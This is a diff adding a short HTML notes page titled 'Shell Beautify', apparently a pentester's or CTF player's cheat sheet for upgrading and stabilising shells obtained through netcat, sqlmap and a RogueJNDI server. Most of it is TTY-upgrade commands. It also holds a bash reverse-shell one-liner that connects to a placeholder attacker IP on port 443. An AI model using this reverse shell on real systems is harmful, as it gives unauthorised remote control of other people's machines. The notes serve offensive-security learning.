@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Shell Beautify</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>Shell Beautify</h1><br/><p>1) Note: To get a proper working shell out of default shell we can use:</p><p>We got a reverse shell! In order to have a functional shell though we can issue the following:</p><p></p><p>These method is used inside <strong>netcat</strong> to get more stable and working shell</p><p></p><p>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</p><p></p><p>OR</p><p></p><p>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</p><p>export TERM=xterm</p><p>CTRL+Z</p><p>stty raw -echo;fg</p><p></p><p></p><p></p><p></p><p>2) Note: We got the shell in sqlmap, however, it is not very stable &amp; interactive. To make it much stable, we will use the</p><p>following payload:</p><p></p><p>This method is used to bring <strong>sqlmap</strong> shell into our netcat listener.</p><p></p><p>bash -c &quot;bash -i &gt;&amp; /dev/tcp/{your_IP}/443 0&gt;&amp;1&quot;</p><p></p><p></p><p></p><p>3) Note: Once we receive the output from the Rogue server, a shell spawns on our Netcat listener and we can</p><p>upgrade the terminal shell using the following command.</p><p></p><p>These method is used with <strong>RogueJNDI</strong> server</p><p></p><p>script /dev/null -c bash</p><p></p><p></p><p><strong>Changing Terminal Size, mainly used for text editors such as Vim or Nano to run properly:</strong></p><p></p><p>In our own terminal run,</p><p></p><p>cd /tmp; stty -a</p><p></p><p>or</p><p></p><p>stty size</p><p></p><p>Get the values of “rows” &amp; “columns”</p><p></p><p>Then in our target machine shell run,</p><p>stty rows &lt;number&gt;</p><p>stty cols &lt;number&gt;</p><p></p><p>or</p><p></p><p>stty rows &lt;number&gt; cols &lt;number&gt;</p><p></p><p></p></div>
+</body>
+</html>
